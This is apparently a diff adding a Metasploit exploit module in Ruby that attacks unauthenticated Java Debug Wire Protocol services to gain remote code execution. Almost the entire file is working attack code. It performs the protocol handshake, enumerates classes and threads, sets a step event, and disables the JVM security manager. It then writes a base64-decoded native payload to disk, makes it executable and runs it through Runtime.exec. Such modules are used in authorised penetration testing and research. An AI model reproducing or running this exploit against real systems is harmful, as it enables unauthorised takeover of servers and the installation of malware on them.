@@ -1,0 +1,960 @@
+##
+# This module requires Metasploit: http//metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+require 'msf/core'
+
+class Metasploit3 < Msf::Exploit::Remote
+  Rank = GoodRanking
+
+  include Msf::Exploit::Remote::Tcp
+  include Msf::Exploit::EXE
+  include Msf::Exploit::FileDropper
+
+  HANDSHAKE                 = "JDWP-Handshake"
+
+  REQUEST_PACKET_TYPE       = 0x00
+  REPLY_PACKET_TYPE         = 0x80
+
+  # Command signatures
+  VERSION_SIG               = [1, 1]
+  CLASSESBYSIGNATURE_SIG    = [1, 2]
+  ALLCLASSES_SIG            = [1, 3]
+  ALLTHREADS_SIG            = [1, 4]
+  IDSIZES_SIG               = [1, 7]
+  CREATESTRING_SIG          = [1, 11]
+  SUSPENDVM_SIG             = [1, 8]
+  RESUMEVM_SIG              = [1, 9]
+  SIGNATURE_SIG             = [2, 1]
+  FIELDS_SIG                = [2, 4]
+  METHODS_SIG               = [2, 5]
+  GETVALUES_SIG             = [2, 6]
+  CLASSOBJECT_SIG           = [2, 11]
+  SETSTATICVALUES_SIG       = [3, 2]
+  INVOKESTATICMETHOD_SIG    = [3, 3]
+  CREATENEWINSTANCE_SIG     = [3, 4]
+  REFERENCETYPE_SIG         = [9, 1]
+  INVOKEMETHOD_SIG          = [9, 6]
+  STRINGVALUE_SIG           = [10, 1]
+  THREADNAME_SIG            = [11, 1]
+  THREADSUSPEND_SIG         = [11, 2]
+  THREADRESUME_SIG          = [11, 3]
+  THREADSTATUS_SIG          = [11, 4]
+  EVENTSET_SIG              = [15, 1]
+  EVENTCLEAR_SIG            = [15, 2]
+  EVENTCLEARALL_SIG         = [15, 3]
+
+  # Other codes
+  MODKIND_COUNT             = 1
+  MODKIND_THREADONLY        = 2
+  MODKIND_CLASSMATCH        = 5
+  MODKIND_LOCATIONONLY      = 7
+  MODKIND_STEP              = 10
+  EVENT_BREAKPOINT          = 2
+  EVENT_STEP                = 1
+  SUSPEND_EVENTTHREAD       = 1
+  SUSPEND_ALL               = 2
+  NOT_IMPLEMENTED           = 99
+  VM_DEAD                   = 112
+  INVOKE_SINGLE_THREADED    = 2
+  TAG_OBJECT                = 76
+  TAG_STRING                = 115
+  TYPE_CLASS                = 1
+  TAG_ARRAY                 = 91
+  TAG_VOID                  = 86
+  TAG_THREAD                = 116
+  STEP_INTO                 = 0
+  STEP_MIN                  = 0
+  THREAD_SLEEPING_STATUS     = 2
+
+  def initialize
+    super(
+      'Name'           => 'Java Debug Wire Protocol Remote Code Execution',
+      'Description'    => %q{
+        This module abuses exposed Java Debug Wire Protocol services in order
+        to execute arbitrary Java code remotely. It just abuses the protocol
+        features, since no authentication is required if the service is enabled.
+      },
+      'Author'         => [
+        'Michael Schierl', # Vulnerability discovery / First exploit seen / Msf module help
+        'Christophe Alladoum', # JDWP Analysis and Exploit
+        'Redsadic <julian.vilas[at]gmail.com>' # Metasploit Module
+      ],
+      'References'     =>
+        [
+          ['OSVDB', '96066'],
+          ['EDB', '27179'],
+          ['URL', 'http://docs.oracle.com/javase/1.5.0/docs/guide/jpda/jdwp-spec.html'],
+          ['URL', 'http://seclists.org/nmap-dev/2010/q1/867'],
+          ['URL', 'https://github.com/schierlm/JavaPayload/blob/master/JavaPayload/src/javapayload/builder/JDWPInjector.java'],
+          ['URL', 'https://svn.nmap.org/nmap/scripts/jdwp-exec.nse'],
+          ['URL', 'http://blog.ioactive.com/2014/04/hacking-java-debug-wire-protocol-or-how.html']
+        ],
+      'Platform'       => %w{ linux win },
+      'Arch'           => ARCH_X86,
+      'Payload'        =>
+        {
+          'Space'        => 2048,
+          'BadChars'    => '',
+          'DisableNops' => true
+        },
+      'Targets'        =>
+        [
+          [ 'Linux x86 (Native Payload)',
+            {
+                'Platform' => 'linux'
+            }
+          ],
+          [ 'Windows x86 (Native Payload)',
+            {
+              'Platform' => 'win'
+            }
+          ]
+        ],
+      'DefaultTarget'  => 0,
+      'License'        => MSF_LICENSE,
+      'DisclosureDate' => 'Mar 12 2010'
+    )
+
+    register_options(
+      [
+        Opt::RPORT(8000),
+        OptInt.new('RESPONSE_TIMEOUT', [true, 'Number of seconds to wait for a server response', 10]),
+        OptString.new('TMP_PATH', [ false, 'A directory where we can write files. Ensure there is a trailing slash']),
+      ], self.class)
+
+    register_advanced_options(
+      [
+        OptInt.new('NUM_RETRIES', [true, 'Number of retries when waiting for event', 10]),
+      ], self.class)
+  end
+
+  def check
+    connect
+    res = handshake
+    disconnect
+
+    if res.nil?
+      return Exploit::CheckCode::Unknown
+    elsif res == HANDSHAKE
+      return Exploit::CheckCode::Appears
+    end
+
+    Exploit::CheckCode::Safe
+  end
+
+
+  def peer
+    "#{rhost}:#{rport}"
+  end
+
+  def default_timeout
+    datastore['RESPONSE_TIMEOUT']
+  end
+
+  # Establishes handshake with the server
+  def handshake
+    sock.put(HANDSHAKE)
+    return sock.get(datastore['RESPONSE_TIMEOUT'])
+  end
+
+  # Forges packet for JDWP protocol
+  def create_packet(cmdsig, data="")
+    flags = 0x00
+    cmdset, cmd = cmdsig
+    pktlen = data.length + 11
+    buf = [pktlen, @my_id, flags, cmdset, cmd]
+    pkt = buf.pack("NNCCC")
+    pkt << data
+    @my_id += 2
+    pkt
+  end
+
+  # Reads packet response for JDWP protocol
+  def read_reply(timeout = default_timeout)
+    response = sock.get(timeout)
+    fail_with(Failure::TimeoutExpired, "#{peer} - Not received response") unless response
+    pktlen, id, flags, errcode = response.unpack('NNCn')
+    response.slice!(0..10)
+    if errcode != 0 && flags == REPLY_PACKET_TYPE
+      fail_with(Failure::Unknown, "#{peer} - Server sent error with code #{errcode}")
+    end
+    response
+  end
+
+  # Returns the characters contained in the string defined in target VM
+  def solve_string(data)
+    sock.put(create_packet(STRINGVALUE_SIG, data))
+    response = read_reply
+    return "" unless response
+    return read_string(response)
+  end
+
+  # Unpacks received string structure from the server response into a normal string
+  def read_string(data)
+    data_len = data.unpack('N')[0]
+    data.slice!(0..3)
+    return data.slice!(0,data_len)
+  end
+
+  # Creates a new string object in the target VM and returns its id
+  def create_string(data)
+    buf = build_string(data)
+    sock.put(create_packet(CREATESTRING_SIG, buf))
+    buf = read_reply
+    return parse_entries(buf, [[@vars['objectid_size'], "obj_id"]], false)
+  end
+
+  # Packs normal string into string structure for target VM
+  def build_string(data)
+    ret = [data.length].pack('N')
+    ret << data
+
+    ret
+  end
+
+  # Pack Fixnum for JDWP protocol
+  def format(fmt, value)
+    if fmt == "L" || fmt == 8
+      return [value].pack('Q>')
+    elsif fmt == "I" || fmt == 4
+      return [value].pack('N')
+    end
+
+    fail_with(Failure::Unknown, "Unknown format")
+  end
+
+  # Unpack Fixnum from JDWP protocol
+  def unformat(fmt, value)
+    if fmt == "L" || fmt == 8
+      return value[0..7].unpack('Q>')[0]
+    elsif fmt == "I" || fmt == 4
+      return value[0..3].unpack('N')[0]
+    end
+
+    fail_with(Failure::Unknown, "Unknown format")
+  end
+
+  # Parses given data according to a set of formats
+  def parse_entries(buf, formats, explicit=true)
+    entries = []
+
+    if explicit
+      nb_entries = buf.unpack('N')[0]
+      buf.slice!(0..3)
+    else
+      nb_entries = 1
+    end
+
+    nb_entries.times do |var|
+
+      if var != 0 && var % 1000 == 0
+        vprint_status("#{peer} - Parsed #{var} classes of #{nb_entries}")
+      end
+
+      data = {}
+
+      formats.each do |fmt,name|
+        if fmt == "L" || fmt == 8
+          data[name] = buf.unpack('Q>')[0]
+          buf.slice!(0..7)
+        elsif fmt == "I" || fmt == 4
+          data[name] = buf.unpack('N')[0]
+          buf.slice!(0..3)
+        elsif fmt == "S"
+          data_len = buf.unpack('N')[0]
+          buf.slice!(0..3)
+          data[name] = buf.slice!(0,data_len)
+        elsif fmt == "C"
+          data[name] = buf.unpack('C')[0]
+          buf.slice!(0)
+        elsif fmt == "Z"
+          t = buf.unpack('C')[0]
+          buf.slice!(0)
+          if t == 115
+            data[name] = solve_string(buf.slice!(0..7))
+          elsif t == 73
+            data[name], buf = buf.unpack('NN')
+          end
+        else
+          fail_with(Failure::UnexpectedReply, "Unexpected data when parsing server response")
+        end
+
+      end
+      entries.append(data)
+    end
+
+    entries
+  end
+
+  # Gets the sizes of variably-sized data types in the target VM
+  def get_sizes
+    formats = [
+        ["I", "fieldid_size"],
+        ["I", "methodid_size"],
+        ["I", "objectid_size"],
+        ["I", "referencetypeid_size"],
+        ["I", "frameid_size"]
+    ]
+    sock.put(create_packet(IDSIZES_SIG))
+    response = read_reply
+    entries = parse_entries(response, formats, false)
+    entries.each { |e| @vars.merge!(e) }
+  end
+
+  # Gets the JDWP version implemented by the target VM
+  def get_version
+    formats = [
+        ["S", "descr"],
+        ["I", "jdwp_major"],
+        ["I", "jdwp_minor"],
+        ["S", "vm_version"],
+        ["S", "vm_name"]
+    ]
+    sock.put(create_packet(VERSION_SIG))
+    response = read_reply
+    entries = parse_entries(response, formats, false)
+    entries.each { |e| @vars.merge!(e) }
+  end
+
+  def version
+    "#{@vars["vm_name"]} - #{@vars["vm_version"]}"
+  end
+
+  def is_java_eight
+    version.downcase =~ /1[.]8[.]/
+  end
+
+  # Returns reference for all threads currently running on target VM
+  def get_all_threads
+    sock.put(create_packet(ALLTHREADS_SIG))
+    response = read_reply
+    num_threads = response.unpack('N').first
+    response.slice!(0..3)
+
+    size = @vars["objectid_size"]
+    num_threads.times do
+      t_id = unformat(size, response[0..size-1])
+      @threads[t_id] = nil
+      response.slice!(0..size-1)
+    end
+  end
+
+  # Returns reference types for all classes currently loaded by the target VM
+  def get_all_classes
+    return unless @classes.empty?
+
+    formats = [
+      ["C", "reftype_tag"],
+      [@vars["referencetypeid_size"], "reftype_id"],
+      ["S", "signature"],
+      ["I", "status"]
+    ]
+    sock.put(create_packet(ALLCLASSES_SIG))
+    response = read_reply
+    @classes.append(parse_entries(response, formats))
+  end
+
+  # Checks if specified class is currently loaded by the target VM and returns it
+  def get_class_by_name(name)
+    @classes.each do |entry_array|
+      entry_array.each do |entry|
+        if entry["signature"].downcase == name.downcase
+          return entry
+        end
+      end
+    end
+
+    nil
+  end
+
+  # Returns information for each method in a reference type (ie. object). Inherited methods are not included.
+  # The list of methods will include constructors (identified with the name "<init>")
+  def get_methods(reftype_id)
+    if @methods.has_key?(reftype_id)
+      return @methods[reftype_id]
+    end
+
+    formats = [
+        [@vars["methodid_size"], "method_id"],
+        ["S", "name"],
+        ["S", "signature"],
+        ["I", "mod_bits"]
+    ]
+    ref_id = format(@vars["referencetypeid_size"],reftype_id)
+    sock.put(create_packet(METHODS_SIG, ref_id))
+    response = read_reply
+    @methods[reftype_id] = parse_entries(response, formats)
+  end
+
+  # Returns information for each field in a reference type (ie. object)
+  def get_fields(reftype_id)
+    formats = [
+            [@vars["fieldid_size"], "field_id"],
+            ["S", "name"],
+            ["S", "signature"],
+            ["I", "mod_bits"]
+    ]
+    ref_id = format(@vars["referencetypeid_size"],reftype_id)
+    sock.put(create_packet(FIELDS_SIG, ref_id))
+    response = read_reply
+    fields = parse_entries(response, formats)
+
+    fields
+  end
+
+  # Returns the value of one static field of the reference type. The field must be member of the reference type
+  # or one of its superclasses, superinterfaces, or implemented interfaces. Access control is not enforced;
+  # for example, the values of private fields can be obtained.
+  def get_value(reftype_id, field_id)
+    data = format(@vars["referencetypeid_size"],reftype_id)
+    data << [1].pack('N')
+    data << format(@vars["fieldid_size"],field_id)
+
+    sock.put(create_packet(GETVALUES_SIG, data))
+    response = read_reply
+    num_values = response.unpack('N')[0]
+
+    unless (num_values == 1) && (response[4].unpack('C')[0] == TAG_OBJECT)
+      fail_with(Failure::Unknown, "Bad response when getting value for field")
+    end
+
+    response.slice!(0..4)
+
+    len = @vars["objectid_size"]
+    value = unformat(len, response)
+
+    value
+  end
+
+  # Sets the value of one static field. Each field must be member of the class type or one of its superclasses,
+  # superinterfaces, or implemented interfaces. Access control is not enforced; for example, the values of
+  # private fields can be set. Final fields cannot be set.For primitive values, the value's type must match
+  # the field's type exactly. For object values, there must exist a widening reference conversion from the
+  # value's type to the field's type and the field's type must be loaded.
+  def set_value(reftype_id, field_id, value)
+    data = format(@vars["referencetypeid_size"],reftype_id)
+    data << [1].pack('N')
+    data << format(@vars["fieldid_size"],field_id)
+    data << format(@vars["objectid_size"],value)
+
+    sock.put(create_packet(SETSTATICVALUES_SIG, data))
+    read_reply
+  end
+
+
+  # Checks if specified method is currently loaded by the target VM and returns it
+  def get_method_by_name(classname, name, signature = nil)
+    @methods[classname].each do |entry|
+        if signature.nil?
+          return entry if entry["name"].downcase == name.downcase
+        else
+          if entry["name"].downcase == name.downcase && entry["signature"].downcase == signature.downcase
+            return entry
+          end
+        end
+    end
+
+    nil
+  end
+
+  # Checks if specified class and method are currently loaded by the target VM and returns them
+  def get_class_and_method(looked_class, looked_method, signature = nil)
+    target_class = get_class_by_name(looked_class)
+    unless target_class
+      fail_with(Failure::Unknown, "Class \"#{looked_class}\" not found")
+    end
+
+    get_methods(target_class["reftype_id"])
+    target_method = get_method_by_name(target_class["reftype_id"], looked_method, signature)
+    unless target_method
+      fail_with(Failure::Unknown, "Method \"#{looked_method}\" not found")
+    end
+
+    return target_class, target_method
+  end
+
+  # Transform string contaning class and method(ie. from "java.net.ServerSocket.accept" to "Ljava/net/Serversocket;" and "accept")
+  def str_to_fq_class(s)
+    i = s.rindex(".")
+    unless i
+      fail_with(Failure::BadConfig, 'Bad defined break class')
+    end
+
+    method = s[i+1..-1] # Subtr of s, from last '.' to the end of the string
+
+    classname = 'L'
+    classname << s[0..i-1].gsub(/[.]/, '/')
+    classname << ';'
+
+    return classname, method
+  end
+
+  # Gets the status of a given thread
+  def thread_status(thread_id)
+    sock.put(create_packet(THREADSTATUS_SIG, format(@vars["objectid_size"], thread_id)))
+    buf = read_reply(datastore['BREAK_TIMEOUT'])
+    unless buf
+      fail_with(Exploit::Failure::Unknown, "No network response")
+    end
+    status, suspend_status = buf.unpack('NN')
+
+    status
+  end
+
+  # Resumes execution of the application or thread after the suspend command or an event has stopped it
+  def resume_vm(thread_id = nil)
+    if thread_id.nil?
+      sock.put(create_packet(RESUMEVM_SIG))
+    else
+      sock.put(create_packet(THREADRESUME_SIG, format(@vars["objectid_size"], thread_id)))
+    end
+
+    response = read_reply(datastore['BREAK_TIMEOUT'])
+    unless response
+      fail_with(Exploit::Failure::Unknown, "No network response")
+    end
+
+    response
+  end
+
+  # Suspend execution of the application or thread
+  def suspend_vm(thread_id = nil)
+    if thread_id.nil?
+      sock.put(create_packet(SUSPENDVM_SIG))
+    else
+      sock.put(create_packet(THREADSUSPEND_SIG, format(@vars["objectid_size"], thread_id)))
+    end
+
+    response = read_reply
+    unless response
+      fail_with(Exploit::Failure::Unknown, "No network response")
+    end
+
+    response
+  end
+
+  # Sets an event request. When the event described by this request occurs, an event is sent from the target VM
+  def send_event(event_code, args)
+    data = [event_code].pack('C')
+    data << [SUSPEND_ALL].pack('C')
+    data << [args.length].pack('N')
+
+    args.each do |kind,option|
+      data << [kind].pack('C')
+      data << option
+    end
+
+    sock.put(create_packet(EVENTSET_SIG, data))
+    response = read_reply
+    unless response
+      fail_with(Exploit::Failure::Unknown, "#{peer} - No network response")
+    end
+    return response.unpack('N')[0]
+  end
+
+  # Parses a received event and compares it with the expected
+  def parse_event(buf, event_id, thread_id)
+    len = @vars["objectid_size"]
+    return false if buf.length < 10 + len - 1
+
+    r_id = buf[6..9].unpack('N')[0]
+    t_id = unformat(len,buf[10..10+len-1])
+
+    return (event_id == r_id) && (thread_id == t_id)
+  end
+
+  # Clear a defined event request
+  def clear_event(event_code, r_id)
+    data = [event_code].pack('C')
+    data << [r_id].pack('N')
+    sock.put(create_packet(EVENTCLEAR_SIG, data))
+    read_reply
+  end
+
+  # Invokes a static method. The method must be member of the class type or one of its superclasses,
+  # superinterfaces, or implemented interfaces. Access control is not enforced; for example, private
+  # methods can be invoked.
+  def invoke_static(class_id, thread_id, meth_id, args = [])
+    data = format(@vars["referencetypeid_size"], class_id)
+    data << format(@vars["objectid_size"], thread_id)
+    data << format(@vars["methodid_size"], meth_id)
+    data << [args.length].pack('N')
+
+    args.each do |arg|
+      data << arg
+      data << [0].pack('N')
+    end
+
+    sock.put(create_packet(INVOKESTATICMETHOD_SIG, data))
+    buf = read_reply
+    buf
+  end
+
+  # Invokes a instance method. The method must be member of the object's type or one of its superclasses,
+  # superinterfaces, or implemented interfaces. Access control is not enforced; for example, private methods
+  # can be invoked.
+  def invoke(obj_id, thread_id, class_id, meth_id, args = [])
+    data = format(@vars["objectid_size"], obj_id)
+    data << format(@vars["objectid_size"], thread_id)
+    data << format(@vars["referencetypeid_size"], class_id)
+    data << format(@vars["methodid_size"], meth_id)
+    data << [args.length].pack('N')
+
+    args.each do |arg|
+      data << arg
+      data << [0].pack('N')
+    end
+
+    sock.put(create_packet(INVOKEMETHOD_SIG, data))
+    buf = read_reply
+    buf
+  end
+
+  # Creates a new object of specified class, invoking the specified constructor. The constructor
+  # method ID must be a member of the class type.
+  def create_instance(class_id, thread_id, meth_id, args = [])
+    data = format(@vars["referencetypeid_size"], class_id)
+    data << format(@vars["objectid_size"], thread_id)
+    data << format(@vars["methodid_size"], meth_id)
+    data << [args.length].pack('N')
+
+    args.each do |arg|
+      data << arg
+      data << [0].pack('N')
+    end
+
+    sock.put(create_packet(CREATENEWINSTANCE_SIG, data))
+    buf = read_reply
+    buf
+  end
+
+  def temp_path
+    return nil unless datastore['TMP_PATH']
+    unless datastore['TMP_PATH'].end_with?('/') || datastore['TMP_PATH'].end_with?('\\')
+      fail_with(Failure::BadConfig, 'You need to add a trailing slash/backslash to TMP_PATH')
+    end
+    datastore['TMP_PATH']
+  end
+
+  # Configures payload according to targeted architecture
+  def setup_payload
+    # 1. Setting up generic values.
+    payload_exe = rand_text_alphanumeric(4 + rand(4))
+    pl_exe = generate_payload_exe
+
+    # 2. Setting up arch specific...
+    case target['Platform']
+    when 'linux'
+      path = temp_path || '/tmp/'
+      payload_exe = "#{path}#{payload_exe}"
+      if @os.downcase =~ /win/
+        print_warning("#{peer} - #{@os} system detected but using Linux target...")
+      end
+    when 'win'
+      path = temp_path || './'
+      payload_exe = "#{path}#{payload_exe}.exe"
+      unless @os.downcase =~ /win/
+        print_warning("#{peer} - #{@os} system detected but using Windows target...")
+      end
+    end
+
+    return payload_exe, pl_exe
+  end
+
+  # Invokes java.lang.System.getProperty() for OS fingerprinting purposes
+  def fingerprint_os(thread_id)
+    size = @vars["objectid_size"]
+
+    # 1. Creates a string on target VM with the property to be getted
+    cmd_obj_ids = create_string("os.name")
+    fail_with(Failure::Unknown, "Failed to allocate string for payload dumping") if cmd_obj_ids.length == 0
+    cmd_obj_id = cmd_obj_ids[0]["obj_id"]
+
+    # 2. Gets property
+    data = [TAG_OBJECT].pack('C')
+    data << format(size, cmd_obj_id)
+    data_array = [data]
+    runtime_class , runtime_meth = get_class_and_method("Ljava/lang/System;", "getProperty")
+    buf = invoke_static(runtime_class["reftype_id"], thread_id, runtime_meth["method_id"], data_array)
+    fail_with(Failure::UnexpectedReply, "Unexpected returned type: expected String") unless buf[0] == [TAG_STRING].pack('C')
+
+    str = unformat(size, buf[1..1+size-1])
+    @os = solve_string(format(@vars["objectid_size"],str))
+  end
+
+  # Creates a file on the server given a execution thread
+  def create_file(thread_id, filename)
+    cmd_obj_ids = create_string(filename)
+    fail_with(Failure::Unknown, "Failed to allocate string for filename") if cmd_obj_ids.length == 0
+
+    cmd_obj_id = cmd_obj_ids[0]["obj_id"]
+    size = @vars["objectid_size"]
+    data = [TAG_OBJECT].pack('C')
+    data << format(size, cmd_obj_id)
+    data_array = [data]
+    runtime_class , runtime_meth = get_class_and_method("Ljava/io/FileOutputStream;", "<init>", "(Ljava/lang/String;)V")
+    buf = create_instance(runtime_class["reftype_id"], thread_id, runtime_meth["method_id"], data_array)
+    fail_with(Failure::UnexpectedReply, "Unexpected returned type: expected Object") unless buf[0] == [TAG_OBJECT].pack('C')
+
+    file = unformat(size, buf[1..1+size-1])
+    fail_with(Failure::Unknown, "Failed to create file. Try to change the TMP_PATH") if file.nil? || (file == 0)
+
+    register_files_for_cleanup(filename)
+
+    file
+  end
+
+  # Stores the payload on a new string created in target VM
+  def upload_payload(thread_id, pl_exe)
+    size = @vars["objectid_size"]
+    if is_java_eight
+      runtime_class , runtime_meth = get_class_and_method("Ljava/util/Base64;", "getDecoder")
+      buf = invoke_static(runtime_class["reftype_id"], thread_id, runtime_meth["method_id"])
+    else
+      runtime_class , runtime_meth = get_class_and_method("Lsun/misc/BASE64Decoder;", "<init>")
+      buf = create_instance(runtime_class["reftype_id"], thread_id, runtime_meth["method_id"])
+    end
+    unless buf[0] == [TAG_OBJECT].pack('C')
+      fail_with(Failure::UnexpectedReply, "Unexpected returned type: expected Object")
+    end
+
+    decoder = unformat(size, buf[1..1+size-1])
+    if decoder.nil? || decoder == 0
+      fail_with(Failure::Unknown, "Failed to create Base64 decoder object")
+    end
+
+    cmd_obj_ids = create_string("#{Rex::Text.encode_base64(pl_exe)}")
+    if cmd_obj_ids.length == 0
+      fail_with(Failure::Unknown, "Failed to allocate string for payload dumping")
+    end
+
+    cmd_obj_id = cmd_obj_ids[0]["obj_id"]
+    data = [TAG_OBJECT].pack('C')
+    data << format(size, cmd_obj_id)
+    data_array = [data]
+
+    if is_java_eight
+      runtime_class , runtime_meth = get_class_and_method("Ljava/util/Base64$Decoder;", "decode", "(Ljava/lang/String;)[B")
+    else
+      runtime_class , runtime_meth = get_class_and_method("Lsun/misc/CharacterDecoder;", "decodeBuffer", "(Ljava/lang/String;)[B")
+    end
+    buf = invoke(decoder, thread_id, runtime_class["reftype_id"], runtime_meth["method_id"], data_array)
+    unless buf[0] == [TAG_ARRAY].pack('C')
+      fail_with(Failure::UnexpectedReply, "Unexpected returned type: expected ByteArray")
+    end
+
+    pl = unformat(size, buf[1..1+size-1])
+    pl
+  end
+
+  # Dumps the payload on a opened server file given a execution thread
+  def dump_payload(thread_id, file, pl)
+    size = @vars["objectid_size"]
+    data = [TAG_OBJECT].pack('C')
+    data << format(size, pl)
+    data_array = [data]
+    runtime_class , runtime_meth = get_class_and_method("Ljava/io/FileOutputStream;", "write", "([B)V")
+    buf = invoke(file, thread_id, runtime_class["reftype_id"], runtime_meth["method_id"], data_array)
+    unless buf[0] == [TAG_VOID].pack('C')
+      fail_with(Failure::Unknown, "Exception while writing to file")
+    end
+  end
+
+  # Closes a file on the server given a execution thread
+  def close_file(thread_id, file)
+    runtime_class , runtime_meth = get_class_and_method("Ljava/io/FileOutputStream;", "close")
+    buf = invoke(file, thread_id, runtime_class["reftype_id"], runtime_meth["method_id"])
+    unless buf[0] == [TAG_VOID].pack('C')
+      fail_with(Failure::Unknown, "Exception while closing file")
+    end
+  end
+
+  # Executes a system command on target VM making use of java.lang.Runtime.exec()
+  def execute_command(thread_id, cmd)
+    size = @vars["objectid_size"]
+
+    # 1. Creates a string on target VM with the command to be executed
+    cmd_obj_ids = create_string(cmd)
+    if cmd_obj_ids.length == 0
+      fail_with(Failure::Unknown, "Failed to allocate string for payload dumping")
+    end
+
+    cmd_obj_id = cmd_obj_ids[0]["obj_id"]
+
+    # 2. Gets Runtime context
+    runtime_class , runtime_meth = get_class_and_method("Ljava/lang/Runtime;", "getRuntime")
+    buf = invoke_static(runtime_class["reftype_id"], thread_id, runtime_meth["method_id"])
+    unless buf[0] == [TAG_OBJECT].pack('C')
+      fail_with(Failure::UnexpectedReply, "Unexpected returned type: expected Object")
+    end
+
+    rt = unformat(size, buf[1..1+size-1])
+    if rt.nil? || (rt == 0)
+      fail_with(Failure::Unknown, "Failed to invoke Runtime.getRuntime()")
+    end
+
+    # 3. Finds and executes "exec" method supplying the string with the command
+    exec_meth = get_method_by_name(runtime_class["reftype_id"], "exec")
+    if exec_meth.nil?
+      fail_with(Failure::BadConfig, "Cannot find method Runtime.exec()")
+    end
+
+    data = [TAG_OBJECT].pack('C')
+    data << format(size, cmd_obj_id)
+    data_array = [data]
+    buf = invoke(rt, thread_id, runtime_class["reftype_id"], exec_meth["method_id"], data_array)
+    unless buf[0] == [TAG_OBJECT].pack('C')
+      fail_with(Failure::UnexpectedReply, "Unexpected returned type: expected Object")
+    end
+  end
+
+  # Set event for stepping into a running thread
+  def set_step_event
+    # 1. Select a thread in sleeping status
+    t_id = nil
+    @threads.each_key do |thread|
+      if thread_status(thread) == THREAD_SLEEPING_STATUS
+        t_id = thread
+        break
+      end
+    end
+    fail_with(Failure::Unknown, "Could not find a suitable thread for stepping") if t_id.nil?
+
+    # 2. Suspend the VM before setting the event
+    suspend_vm
+
+    vprint_status("#{peer} - Setting 'step into' event in thread: #{t_id}")
+    step_info = format(@vars["objectid_size"], t_id)
+    step_info << [STEP_MIN].pack('N')
+    step_info << [STEP_INTO].pack('N')
+    data = [[MODKIND_STEP, step_info]]
+
+    r_id = send_event(EVENT_STEP, data)
+    unless r_id
+      fail_with(Failure::Unknown, "Could not set the event")
+    end
+
+    return r_id, t_id
+  end
+
+  # Disables security manager if it's set on target JVM
+  def disable_sec_manager
+    sys_class = get_class_by_name("Ljava/lang/System;")
+
+    fields = get_fields(sys_class["reftype_id"])
+
+    sec_field = nil
+
+    fields.each do |field|
+      sec_field = field["field_id"] if field["name"].downcase == "security"
+    end
+
+    fail_with(Failure::Unknown, "Security attribute not found") if sec_field.nil?
+
+    value = get_value(sys_class["reftype_id"], sec_field)
+
+    if(value == 0)
+      print_good("#{peer} - Security manager was not set")
+    else
+      set_value(sys_class["reftype_id"], sec_field, 0)
+      if get_value(sys_class["reftype_id"], sec_field) == 0
+        print_good("#{peer} - Security manager has been disabled")
+      else
+        print_good("#{peer} - Security manager has not been disabled, trying anyway...")
+      end
+    end
+  end
+
+  # Uploads & executes the payload on the target VM
+  def exec_payload(thread_id)
+    # 0. Fingerprinting OS
+    fingerprint_os(thread_id)
+
+    vprint_status("#{peer} - Executing payload on \"#{@os}\", target version: #{version}")
+
+    # 1. Prepares the payload
+    payload_exe, pl_exe = setup_payload
+
+    # 2. Creates file on server for dumping payload
+    file = create_file(thread_id, payload_exe)
+
+    # 3. Uploads payload to the server
+    pl = upload_payload(thread_id, pl_exe)
+
+    # 4. Dumps uploaded payload into file on the server
+    dump_payload(thread_id, file, pl)
+
+    # 5. Closes the file on the server
+    close_file(thread_id, file)
+
+    # 5b. When linux arch, give execution permissions to file
+    if target['Platform'] == 'linux'
+      cmd = "chmod +x #{payload_exe}"
+      execute_command(thread_id, cmd)
+    end
+
+    # 6. Executes the dumped payload
+    cmd = "#{payload_exe}"
+    execute_command(thread_id, cmd)
+  end
+
+
+  def exploit
+    @my_id = 0x01
+    @vars = {}
+    @classes = []
+    @methods = {}
+    @threads = {}
+    @os = nil
+
+    connect
+
+    unless handshake == HANDSHAKE
+      fail_with(Failure::NotVulnerable, "JDWP Protocol not found")
+    end
+
+    print_status("#{peer} - Retrieving the sizes of variable sized data types in the target VM...")
+    get_sizes
+
+    print_status("#{peer} - Getting the version of the target VM...")
+    get_version
+
+    print_status("#{peer} - Getting all currently loaded classes by the target VM...")
+    get_all_classes
+
+    print_status("#{peer} - Getting all running threads in the target VM...")
+    get_all_threads
+
+    print_status("#{peer} - Setting 'step into' event...")
+    r_id, t_id = set_step_event
+
+    print_status("#{peer} - Resuming VM and waiting for an event...")
+    response = resume_vm
+
+    unless parse_event(response, r_id, t_id)
+      datastore['NUM_RETRIES'].times do |i|
+        print_status("#{peer} - Received #{i + 1} responses that are not a 'step into' event...")
+        buf = read_reply
+        break if parse_event(buf, r_id, t_id)
+
+        if i == datastore['NUM_RETRIES']
+          fail_with(Failure::Unknown, "Event not received in #{datastore['NUM_RETRIES']} attempts")
+        end
+      end
+    end
+
+    vprint_status("#{peer} - Received matching event from thread #{t_id}")
+    print_status("#{peer} - Deleting step event...")
+    clear_event(EVENT_STEP, r_id)
+
+    print_status("#{peer} - Disabling security manager if set...")
+    disable_sec_manager
+
+    print_status("#{peer} - Dropping and executing payload...")
+    exec_payload(t_id)
+
+    disconnect
+  end
+end
